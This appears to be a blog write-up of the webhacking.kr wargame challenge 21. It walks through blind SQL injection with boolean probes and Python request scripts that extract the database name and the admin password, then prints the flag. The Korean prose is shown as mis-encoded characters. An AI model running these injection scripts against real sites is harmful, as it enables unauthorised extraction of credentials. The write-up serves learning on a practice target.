---
title: "[webhacking.kr] 21ë²ˆ ë¬¸ì œ í’€ì´[blind sql injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - blind sql injection
  - sql
toc: true
toc_sticky: true
toc_label: "21ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/webhacking.jpg
---

ğŸ’¡ Webhacking.kr challenge(old) 21ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
## ë¬¸ì œ í™”ë©´
  ![image](https://user-images.githubusercontent.com/33647663/150917552-08962536-c588-488d-a29a-040408cf0151.png)
   
## ë¬¸ì œ í’€ì´
   guest / guest ë¥¼ ì…ë ¥í•˜ë©´ ë‹¤ìŒí™”ë©´ê³¼ ê°™ì´ **login success** ë¬¸êµ¬ê°€ ë‚˜ì˜µë‹ˆë‹¤.
   
   ![image](https://user-images.githubusercontent.com/33647663/150917693-b7898772-6d5d-420d-b63c-337992a0b9e1.png)

   guest / 1234ë¥¼ ì…ë ¥í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ **login fail** ë¬¸êµ¬ê°€ ë‚˜ì˜µë‹ˆë‹¤. 

   ![image](https://user-images.githubusercontent.com/33647663/150917778-0d17494c-c240-456f-bb8c-ddef2505928c.png)

   blind sql injectionì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ë¹„ë°€ë²ˆí˜¸ ì…ë ¥í•˜ëŠ” ë¶€ë¶„ì— ì°¸ / ê±°ì§“ì„ íŒë‹¨í•  ìˆ˜ ìˆëŠ” ì¿¼ë¦¬ë¬¸ì„ ì‘ì„±í•´ ë´…ë‹ˆë‹¤.
   
   ì„œë²„ìª½ DBì— ë“¤ì–´ê°€ëŠ” ì¿¼ë¦¬ê°€ ë‹¤ìŒê³¼ ê°™ì´ ì‘ì„±ë˜ì–´ ìˆì„ê²ƒì´ë¼ ê°€ì •í•˜ê³ , $pwë¶€ë¶„ì— ë‹¤ìŒ ì¿¼ë¦¬ë¬¸ë“¤ì„ ì…ë ¥í•´ ë´…ë‹ˆë‹¤.

   ```sql
   select * from chall21 where id='$id' and pw='$pw';
   ```

   
   > ```' or 1=1 -- ``` : Trueí™”ë©´
   > 
   > ![image](https://user-images.githubusercontent.com/33647663/150918138-db079501-c570-473b-8b5d-832b4644fc53.png)

   > ```' or 1=2 -- ``` : Falseí™”ë©´
   > 
   > ![image](https://user-images.githubusercontent.com/33647663/150918178-0e86c772-ec21-4fa6-a8a9-679f22ecce8f.png)

   ê²°ê³¼ë¥¼ ë³´ê³  ì¶”ë¡ ì„ í•´ë³´ìë©´, sql ë¬¸ì˜ ê²°ê³¼ë¡œ ë¶€í„° DBì—ì„œ id,pwë¥¼ ë¶ˆëŸ¬ì˜¤ê³  phpì—ì„œ í•œë²ˆë” ê²€ì¦ì„ í•˜ëŠ” ê³¼ì •ì´ ìˆëŠ” ê²ƒ ê°™ìŠµë‹ˆë‹¤.
   
    DBì—ì„œ ì•„ë¬´ê²ƒë„ ë°˜í™˜ë˜ì§€ ì•Šìœ¼ë©´ -> login fail
    
    DBì—ì„œ ë°˜í™˜ì´ ë˜ì—ˆì§€ë§Œ php ì½”ë“œì—ì„œ í•œë²ˆë” ê²€ì¦í• ë•Œ ê°’ì´ í‹€ë¦¬ë©´ -> wrong password ë¡œ ì¶œë ¥ì´ ë˜ëŠ” ê²ƒ ê°™ìŠµë‹ˆë‹¤.

    ì¤‘ìš”í•œê±´ 1=1 ë¶€ë¶„ê³¼ 1=2 ë¶€ë¶„ì—ì„œ ì°¸ ê±°ì§“ì„ íŒë‹¨í•  ìˆ˜ ìˆëŠ” ì§€ì ì„ ì°¾ì•˜ê¸° ë•Œë¬¸ì— ì €ê³³ì„ ì´ìš©í•´ì„œ Blind sql injectionì„ ìˆ˜í–‰í•˜ê² ìŠµë‹ˆë‹¤.


## Blind sql injection
  ìš°ì„  DBëª… / tableëª… / ì»¬ëŸ¼ëª… ì•„ë¬´ê²ƒë„ ì•Œê³  ìˆëŠ” ê²ƒì´ ì—†ìœ¼ë¯€ë¡œ ì°¨ë¡€ëŒ€ë¡œ êµ¬í•´ë³´ê² ìŠµë‹ˆë‹¤. ì‘ì—…ì€ Python ì½”ë“œë¡œ í–ˆìŠµë‹ˆë‹¤. 
   
  **DBì´ë¦„ êµ¬í•˜ê¸°**
  
  ```python
  database_length = 10
  database_name = ''
  for i in range(1,database_length + 1):
      for j in range(127,32,-1):
          payload = "' or ascii(substr(database(),{},1)) = {} -- ".format(i,j)
          params['pw'] = payload
          response = requests.get(url,params=params)
          if(TRUE_FLAG in response.text):
              database_name += chr(j)
              print('database_name = ' + database_name)
              break
  print("database_name =" + database_name)
  ```

  ì½”ë“œ ì‹¤í–‰ê²°ê³¼ DBì´ë¦„ì€ 'webhacking'ì´ì—ˆìŠµë‹ˆë‹¤.
  ê·¸ë‹¤ìŒì€ information_schema ë¥¼ ì´ìš©í•´ì„œ tableëª…ì„ ì•Œì•„ë‚´ë ¤ê³  í–ˆëŠ”ë°, selectë¬¸ì´ í•„í„°ë§ ë˜ì–´ ìˆì—ˆìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150922131-df6af47f-30b7-49b5-b050-175b1e043b87.png)

  ê·¸ë˜ì„œ ì›ë˜ëŠ” ë‹¤ìŒê³¼ ê°™ì´ í˜ì´ë¡œë“œë¥¼ êµ¬ì„±í•˜ê³  injectionì„ ìˆ˜í–‰í•˜ë ¤ê³  í–ˆëŠ”ë° ì´ ë°©ë²•ì€ ì•ˆë ê²ƒ ê°™ìŠµë‹ˆë‹¤.

  ```python
  for i in range(20):
    for j in range(32,127):
        payload = "' or (select ascii(substr(table_name,{},1)) from information_schema.tables where table_schema='webhacking') = {} -- ".format(i,j)
  ```

  ì—¬ëŸ¬ê°€ì§€ ì‚½ì§‘ì„ ì¢€ í•´ë³¸ê²°ê³¼ columnëª…ì„ í•œë²ˆ ì¶”ì¸¡í•´ì„œ í•´ë´¤ìŠµë‹ˆë‹¤. id ê°’ì„ ì €ì¥í•˜ëŠ” ì»¬ëŸ¼ëª…ì„ 'id', pw ê°’ì„ ì €ì¥í•˜ëŠ” ì»¬ëŸ¼ëª…ì„ 'pw'ë¡œ ê°€ì •í•˜ê³  blind sql injectionì„ ìˆ˜í–‰í•˜ë‹ˆ í’€ë ¸ìŠµë‹ˆë‹¤. ì´ë•Œ ì‚¬ìš©í•œ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

  ```python
  def get_password_length():
    for i in range(1,100):
        payload = "' or length(pw) = {} and id='admin' -- ".format(str(i))
        params['pw'] = payload
        response = requests.get(url,params=params)
        
        if('wrong password' in response.text):
            print("find password length")
            return i
  ```

  ì¶”ê°€ë¡œ ì €ì˜ payloadë¥¼ ë³´ë©´ ```or length(pw) = {} and id='admin' -- ``` ìœ¼ë¡œ id='admin'ì¸ ì¡°ê±´ì„ ê±¸ì–´ì¤¬ìŠµë‹ˆë‹¤. í•´ë‹¹ ì¡°ê±´ì„ ì•ˆê±¸ì–´ ì£¼ë©´ id='guest'ì¸ ê²½ìš°ì˜ ë¹„ë°€ë²ˆí˜¸ë„ ê°™ì´ ì¡°ê±´ì„ ë§Œì¡±í•˜ê²Œ ë˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. 

  ìœ„ì˜ ì½”ë“œë¡œ ì‹¤í–‰í•´ë³¸ ê²°ê³¼ ì»¬ëŸ¼ì— ìˆëŠ” ë°ì´í„°ì˜ ê¸¸ì´ëŠ” 36ìë¦¬ ì˜€ìŠµë‹ˆë‹¤.

  ê·¸ ë‹¤ìŒì€ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì•Œì•„ë‚´ëŠ” ì½”ë“œì…ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œëŠ” forë¬¸ ë°˜ë³µ ë¶€ë¶„ì—ì„œ asciiì½”ë“œ ê°’ì„ 1ì”© ì¦ê°€ì‹œì¼œì„œ ë‹¨ìˆœ ë¹„êµë¥¼ í•˜ì§€ë§Œ, ì €ëŠ” binary search ì•Œê³ ë¦¬ì¦˜ì„ ì‚¬ìš©í•´ì„œ ì„±ëŠ¥ì„ í›¨ì”¬ ì˜¬ë ¸ìŠµë‹ˆë‹¤.

  ì˜ˆë¥¼ë“¤ì–´ 
  ```python
  for i in range(32,127):
    payload = ' or ascii(substr(pw,1,1)) = {}-- '.format(i)
  ```
  ì´ë ‡ê²Œ ì‘ì„±í•˜ë©´ ë§Œì•½ ë¹„ë°€ë²ˆí˜¸ì˜ ì²«ë²ˆì§¸ ê°’ì´ zë¼ë©´ ì•„ìŠ¤í‚¤ ì½”ë“œê°’ì´ 122ë¼ì„œ ë¬´ë ¤ 90ë²ˆì˜ ì‹œë„ë¥¼ í•˜ê³ ë‚˜ì„œì•¼ ì²«ë²ˆì§¸ ê¸€ìë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

  í•˜ì§€ë§Œ binary search ì•Œê³ ë¦¬ì¦˜ì„ ì‚¬ìš©í•˜ë©´ ì €ëŠ” ìµœëŒ€ 8ë²ˆ ì•ˆì— ë¬´ì¡°ê±´ ê°’ì„ ì°¾ì•„ë‚¼ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ì„±ëŠ¥ ì°¨ì´ê°€ ë§ì´ ë‚©ë‹ˆë‹¤. 

  ë³¸ ë¬¸ì œì—ì„œëŠ” ì°¾ì•„ì•¼í•˜ëŠ” ë¹„ë°€ë²ˆí˜¸ê°€ ë¬´ë ¤ 36ìë¦¬ì´ê¸° ë•Œë¬¸ì— ë³´ë‹¤ í™•ì‹¤í•œ ì„±ëŠ¥ ì°¨ì´ê°€ ë‚¬ìŠµë‹ˆë‹¤.

  ë‹¨ìˆœ ë°˜ë³µë¬¸ì€ ì¿¼ë¦¬ë¥¼ 3420ë²ˆ ì„ ìˆ˜í–‰í–ˆê³ , binary search ì•Œê³ ë¦¬ì¦˜ì€ ì¿¼ë¦¬ë¥¼ 210ë²ˆ ìˆ˜í–‰í•´ì„œ ê²°ê³¼ë¥¼ ë„ì¶œí•´ ëƒˆìŠµë‹ˆë‹¤.**í‰ê· ì ìœ¼ë¡œ ë‹¨ìˆœ ë°˜ë³µë¬¸ì€ í•˜ë‚˜ì˜ ê¸€ìë¥¼ ì°¾ê¸° ìœ„í•´ì„œ 95ë²ˆì˜ ì¿¼ë¦¬ë¥¼, binary searchëŠ” 6ë²ˆì˜ ì¿¼ë¦¬ë¥¼ ìˆ˜í–‰í–ˆìŠµë‹ˆë‹¤.** 
  
  ë‹¨ìˆœ ë°˜ë³µë¬¸ ê²°ê³¼ : ![image](https://user-images.githubusercontent.com/33647663/150933253-e02e01b9-3d81-4657-bbdc-afc880197afb.png)

  binary Search ê²°ê³¼ : ![image](https://user-images.githubusercontent.com/33647663/150928020-6fae8811-fdf9-413e-8dc3-9ab978a57d93.png)


  ìµœì¢… ë¹„ë°€ë²ˆí˜¸ : **there_is_no_rest_for_the_white_angel**

  ì‚¬ìš©í•œ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤

  <script src="https://gist.github.com/kangmyoungseok/f039f0e0b1b832aa98f7aa7b255b4589.js"></script>
